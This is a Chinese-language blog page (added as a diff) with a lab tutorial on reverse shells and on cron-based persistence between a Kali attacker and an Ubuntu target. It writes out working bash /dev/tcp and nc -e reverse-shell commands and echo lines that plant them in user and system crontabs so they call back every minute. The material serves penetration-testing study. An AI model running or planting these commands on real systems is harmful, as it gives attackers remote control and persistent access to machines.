@@ -1,0 +1,615 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ccccff">
+  <meta name="author" content="echozt">
+  <meta name="keywords" content="网络安全，计算机，渗透">
+  
+    <meta name="description" content="00x0 前言    不知道为什么我之前练习的靶场中关于反弹shell，都是不成功，找了很多原因，很头疼。觉得还是要从根源找原因，然后认真的记录了一下关于反弹shell和利用计划任务进行反弹shell的原理。用centos作为靶机环境没那么麻烦，但我用的Ubuntu，问就是不想再下个centos的镜像了呜呜呜。 00x1反弹shell    对于正向连接和反弹shell，我浅显地理解为：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell与计划任务">
+<meta property="og:url" content="https://echozt.github.io/posts/192.html">
+<meta property="og:site_name" content="echozt">
+<meta property="og:description" content="00x0 前言    不知道为什么我之前练习的靶场中关于反弹shell，都是不成功，找了很多原因，很头疼。觉得还是要从根源找原因，然后认真的记录了一下关于反弹shell和利用计划任务进行反弹shell的原理。用centos作为靶机环境没那么麻烦，但我用的Ubuntu，问就是不想再下个centos的镜像了呜呜呜。 00x1反弹shell    对于正向连接和反弹shell，我浅显地理解为：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/1.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/1_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/3_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/3_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/3_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/4_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/4_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/4_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/5.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/5_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/undefined/5_3.png">
+<meta property="article:published_time" content="2022-12-02T06:22:08.000Z">
+<meta property="article:modified_time" content="2022-12-02T07:02:57.049Z">
+<meta property="article:author" content="echozt">
+<meta property="article:tag" content="反弹shell">
+<meta property="article:tag" content="计划任务">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://echozt.github.io/posts/undefined/1.png">
+  
+  
+  <title>反弹shell与计划任务 - echozt</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/daziyanse.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"echozt.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="echozt" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>echozt&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="反弹shell与计划任务">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      echozt
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-12-02 14:22" pubdate>
+        2022年12月2日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.7k 字
+    </span>
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">反弹shell与计划任务</h1>
+            
+            <div class="markdown-body">
+              <h1 id="00x0-前言"><a href="#00x0-前言" class="headerlink" title="00x0 前言"></a>00x0 前言</h1><p>    不知道为什么我之前练习的靶场中关于反弹shell，都是不成功，找了很多原因，很头疼。觉得还是要从根源找原因，然后认真的记录了一下关于反弹shell和利用计划任务进行反弹shell的原理。用centos作为靶机环境没那么麻烦，但我用的Ubuntu，问就是不想再下个centos的镜像了呜呜呜。</p>
+<h1 id="00x1反弹shell"><a href="#00x1反弹shell" class="headerlink" title="00x1反弹shell"></a>00x1反弹shell</h1><p>    对于正向连接和反弹shell，我浅显地理解为：</p>
+<p>    正向连接：先在靶机上监听端口，或者靶机上开放了某个特殊端口，然后在攻击机上进行连接利用。</p>
+<p>    反向连接：先在攻击机上监听端口，然后在靶机上发送请求命令到攻击机，使靶机的命令行反弹到攻击机中。</p>
+<blockquote>
+<p>kali：192.168.25.128</p>
+<p>Ubuntu：192.168.25.129</p>
+</blockquote>
+<h2 id="1、bash反弹"><a href="#1、bash反弹" class="headerlink" title="1、bash反弹"></a>1、bash反弹</h2><p>    kali作为攻击机，Ubuntu作为靶机</p>
+<p>（1） 先在kali上监听端口</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 9999
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>（2）在Ubuntu上输入反弹shell命令</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.25.128/9999 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>  <img src="/posts/undefined/1.png" srcset="/img/loading.gif" lazyload class></p>
+<h2 id="2、nc反弹"><a href="#2、nc反弹" class="headerlink" title="2、nc反弹"></a>2、nc反弹</h2><p>    因为这里Ubuntu不能使用nc -e命令，所以将kali作为靶机，Ubuntu作为攻击机。</p>
+<p>（1）Ubuntu上监听9999端口</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 9999
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>（2）kali靶机执行命令将自己终端送出去</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/bash 192.168.25.129 9999
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>  <img src="/posts/undefined/1_2.png" srcset="/img/loading.gif" lazyload class></p>
+<h1 id="00x2-计划任务"><a href="#00x2-计划任务" class="headerlink" title="00x2 计划任务"></a>00x2 计划任务</h1><h2 id="1、crontab命令格式"><a href="#1、crontab命令格式" class="headerlink" title="1、crontab命令格式"></a>1、crontab命令格式</h2><p>    crontab的命令构成为时间+动作，格式：* * * * * xxx，这里的*就代表一个时间维度的划分（时间维度依次是分、时、日、月、周这五种），xxx代表动作。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">例如：*/1 * * * * <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> dev/tcp/192.168.25.128/9999 0<span class="token operator">></span><span class="token operator">&amp;</span>1 就表示在一分钟内执行后面的命令。
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="2、计划任务目录"><a href="#2、计划任务目录" class="headerlink" title="2、计划任务目录"></a>2、计划任务目录</h2><pre class="line-numbers language-bash"><code class="language-bash"> 系统级的计划任务目录：/etc/crontab
+
+ 用户级的计划任务目录：
+
+     centos计划任务目录：/var/spool/cron/
+
+     ubuntu计划任务目录：/var/spool/cron/crontabs/
+
+     用户级的计划任务目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名。
+
+ 计划任务日志<span class="token punctuation">(</span>系统日志<span class="token punctuation">)</span>：/var/log/syslog
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="3、crontab常用命令及参数"><a href="#3、crontab常用命令及参数" class="headerlink" title="3、crontab常用命令及参数"></a>3、crontab常用命令及参数</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e <span class="token comment" spellcheck="true">#编辑计划任务</span>
+
+<span class="token function">crontab</span> -l <span class="token comment" spellcheck="true">#列出计划任务</span>
+
+<span class="token function">crontab</span> -r <span class="token comment" spellcheck="true">#删除计划任务</span>
+
+注意：这里针对的都是用户级的计划任务，系统级的直接在/etc/crontab中编辑删除即可。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="00x3-利用计划任务反弹shell"><a href="#00x3-利用计划任务反弹shell" class="headerlink" title="00x3 利用计划任务反弹shell"></a>00x3 利用计划任务反弹shell</h1><blockquote>
+<p>kali：192.168.25.128</p>
+<p>Ubuntu：192.168.25.129</p>
+</blockquote>
+<blockquote>
+<p>centos计划任务目录：/var/spool/cron/</p>
+<p>ubuntu计划任务目录：/var/spool/cron/crontabs/</p>
+<p>系统级计划任务目录：/etc/crontabS</p>
+</blockquote>
+<p>记得先在攻击机kali上监听端口！！！</p>
+<h2 id="1、方法一：使用crontab-e写入命令"><a href="#1、方法一：使用crontab-e写入命令" class="headerlink" title="1、方法一：使用crontab -e写入命令"></a>1、方法一：使用crontab -e写入命令</h2><p>    这种方式，就是利用crontab -e命令，写入计划任务。实际上就是会自动在计划任务目录下创建了一个以当前用户名为名称的文件，文件的内容就是前面写入的计划任务。</p>
+<h3 id="（1）在kali监听端口23333"><a href="#（1）在kali监听端口23333" class="headerlink" title="（1）在kali监听端口23333"></a>（1）在kali监听端口23333</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 23333
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（2）在Ubuntu上输入crontab-e，这里选择2号编辑器，写入命令并保存"><a href="#（2）在Ubuntu上输入crontab-e，这里选择2号编辑器，写入命令并保存" class="headerlink" title="（2）在Ubuntu上输入crontab -e，这里选择2号编辑器，写入命令并保存"></a>（2）在Ubuntu上输入crontab -e，这里选择2号编辑器，写入命令并保存</h3><pre class="line-numbers language-bash"><code class="language-bash">centos输入以下命令：
+
+*/1 * * * * <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> dev/tcp/192.168.25.128/9999 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+
+Ubuntu输入以下命令：
+
+*/1 * * * * <span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/23333 0>&amp;1"</span>
+
+至于-i参数前的bash还可以为bin/bash，至于使用哪个，可以使用echo <span class="token variable">$0</span>命令，查看当前窗口的shell是哪个，就用哪个。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> <img src="/posts/undefined/3.png" srcset="/img/loading.gif" lazyload class></p>
+<h3 id="（3）使用crontab-l命令，可以列出计划任务"><a href="#（3）使用crontab-l命令，可以列出计划任务" class="headerlink" title="（3）使用crontab -l命令，可以列出计划任务"></a>（3）使用crontab -l命令，可以列出计划任务</h3><p>  <img src="/posts/undefined/3_2.png" srcset="/img/loading.gif" lazyload class></p>
+<p>    在ubuntu的计划任务目录/var/spool/cron/crontabs下多了一个root文件。该文件下的内容就是之前写入的反弹shell内容。这里我是使用的root用户写入的计划任务，所以生成的是以root为名称的文件，当使用其他普通用户创建时，生成的则是以其他用户命名的文件名称。</p>
+<p>   <img src="/posts/undefined/3_3.png" srcset="/img/loading.gif" lazyload class></p>
+<h3 id="（4）成功反弹shell"><a href="#（4）成功反弹shell" class="headerlink" title="（4）成功反弹shell"></a>（4）成功反弹shell</h3><p>   <img src="/posts/undefined/3_4.png" srcset="/img/loading.gif" lazyload class></p>
+<h2 id="2、方法二：使用echo写入文件到用户级的计划任务"><a href="#2、方法二：使用echo写入文件到用户级的计划任务" class="headerlink" title="2、方法二：使用echo写入文件到用户级的计划任务"></a>2、方法二：使用echo写入文件到用户级的计划任务</h2><p>    使用echo命令直接写入反弹shell命令到计划任务目录中的文件中。其中，可以将反弹shell先写入一个sh文件（注意这里的sh文件要赋予执行权限），然后再执行echo命令。使用echo重定向生成的root目录或其他用户名的目录在Ubuntu系统中要改权限为600。</p>
+<p>重定向符&gt;与&gt;&gt;区别：</p>
+<p>    1）echo ‘xxx’ &gt; 2.txt（就是将xxx的内容重定向到2.txt中，使用重定向符&gt;表示如果2.txt不存在则会创建，如果存在，会覆盖2.txt之前的内容。）</p>
+<p>    2）echo ‘xxx’ &gt;&gt; 2.txt （同样是将1.txt的内容重定向到2.txt中，使用重定向符&gt;&gt;表示如果2.txt不存在则创建，如果存在，会将1.txt的内容添加到2.txt原来内容的后面，不会覆盖。所以写入到系统级计划任务最好使用&gt;&gt;重定向符，避免覆盖之前的内容。）</p>
+<h3 id="（1）先在kali监听端口22222"><a href="#（1）先在kali监听端口22222" class="headerlink" title="（1）先在kali监听端口22222"></a>（1）先在kali监听端口22222</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 22222
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（2）直接在靶机上输入如下命令"><a href="#（2）直接在靶机上输入如下命令" class="headerlink" title="（2）直接在靶机上输入如下命令"></a>（2）直接在靶机上输入如下命令</h3><pre class="line-numbers language-bash"><code class="language-bash">centos：
+    <span class="token keyword">echo</span> <span class="token string">'*/1 * * * * bash -i >&amp; /dev/tcp/192.168.25.128/11111 0>&amp;1'</span> <span class="token operator">></span> /var/spool/cron/root
+
+Ubuntu：
+    <span class="token keyword">echo</span> <span class="token string">'*/1 * * * * bash -c "bash -i >&amp; /dev/tcp/192.168.25.128/11111 0>&amp;1"'</span> <span class="token operator">></span> /var/spool/cron/crontabs/root
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>或者</p>
+<p>    先在tmp目录下创建一个sh文件，这里创建111.sh，并写入以下内容：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/11111 0>&amp;1"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>    这里也要注意，这个111.sh要赋予执行权限，chmod +x 111.sh才行！</p>
+<p>    然后使用echo命令：    </p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"*/1 * * * * /tmp/111.sh"</span> <span class="token operator">></span> /var/spool/cron/crontabs/root
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>   <img src="/posts/undefined/4.png" srcset="/img/loading.gif" lazyload class></p>
+<p>    其中的root，根据方法一可知，可以替换为其他用户的名称。</p>
+<h3 id="（3）使用crontab-l查看计划任务是否写入成功"><a href="#（3）使用crontab-l查看计划任务是否写入成功" class="headerlink" title="（3）使用crontab -l查看计划任务是否写入成功"></a>（3）使用crontab -l查看计划任务是否写入成功</h3><p>   <img src="/posts/undefined/4_2.png" srcset="/img/loading.gif" lazyload class></p>
+<h4 id="（4）反弹shell成功"><a href="#（4）反弹shell成功" class="headerlink" title="（4）反弹shell成功"></a>（4）反弹shell成功</h4><p>    到这里，centos应该反弹成功了，但是，Ubuntu还不行。使用echo创建的root文件权限默认为644，而计划任务的root文件权限必须为600。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">所以先改权限为600：chmod 600 root
+
+然后重启cron服务即可：systemctl restart <span class="token function">cron</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>   <img src="/posts/undefined/4_3.png" srcset="/img/loading.gif" lazyload class></p>
+<p>    反弹shell成功：</p>
+<p>   <img src="/posts/undefined/4_4.png" srcset="/img/loading.gif" lazyload class></p>
+<h2 id="3、方法三：echo写入文件到系统级的计划任务"><a href="#3、方法三：echo写入文件到系统级的计划任务" class="headerlink" title="3、方法三：echo写入文件到系统级的计划任务"></a>3、方法三：echo写入文件到系统级的计划任务</h2><p>    这里跟写入到用户级的差不多，只是在计划任务处需要添加用户名，而且是直接写入到系统级计划任务目录/etc/crontab中，所以记得使用&gt;&gt;重定向符。也可以同样先创建sh文件并赋予执行权限后，使用echo命令写入到计划任务中。</p>
+<h3 id="（1）先在kali监听端口33333"><a href="#（1）先在kali监听端口33333" class="headerlink" title="（1）先在kali监听端口33333"></a>（1）先在kali监听端口33333</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 33333
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（2）直接在靶机上输入如下命令-1"><a href="#（2）直接在靶机上输入如下命令-1" class="headerlink" title="（2）直接在靶机上输入如下命令"></a>（2）直接在靶机上输入如下命令</h3><pre class="line-numbers language-bash"><code class="language-bash">centos：
+    <span class="token keyword">echo</span> <span class="token string">'*/1 * * * * root bash -i >&amp; /dev/tcp/192.168.25.128/33333 0>&amp;1'</span> <span class="token operator">>></span> /etc/crontab
+
+Ubuntu：
+    <span class="token keyword">echo</span> <span class="token string">'*/1 * * * * root bash -c "bash -i >&amp; /dev/tcp/192.168.25.128/33333 0>&amp;1"'</span> <span class="token operator">>></span> /etc/crontab
+
+（这里使用<span class="token operator">>></span>是将内容接着写入到/etc/crontab，而<span class="token operator">></span>是直接覆盖之前的文件，所以这里用<span class="token operator">>></span>重定向符）
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>   <img src="/posts/undefined/5.png" srcset="/img/loading.gif" lazyload class></p>
+<p>或者</p>
+<p>    先在tmp目录下创建一个sh文件，这里创建222.sh，并写入以下内容：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/33333 0>&amp;1"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>    这里也要注意，这个222.sh要赋予执行权限，chmod +x /tmp/222.sh才行！</p>
+<p>    然后使用echo命令：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"*/1 * * * * root /tmp/222.sh"</span> <span class="token operator">>></span> /etc/crontab
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>   <img src="/posts/undefined/5_2.png" srcset="/img/loading.gif" lazyload class></p>
+<h3 id="（3）反弹shell成功"><a href="#（3）反弹shell成功" class="headerlink" title="（3）反弹shell成功"></a>（3）反弹shell成功</h3><p>  <img src="/posts/undefined/5_3.png" srcset="/img/loading.gif" lazyload class></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">计划任务</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/7071.html">
+                        <span class="hidden-mobile">frida+objection绕过SSL Pinning</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/dianjichuzi.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/timeDate.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
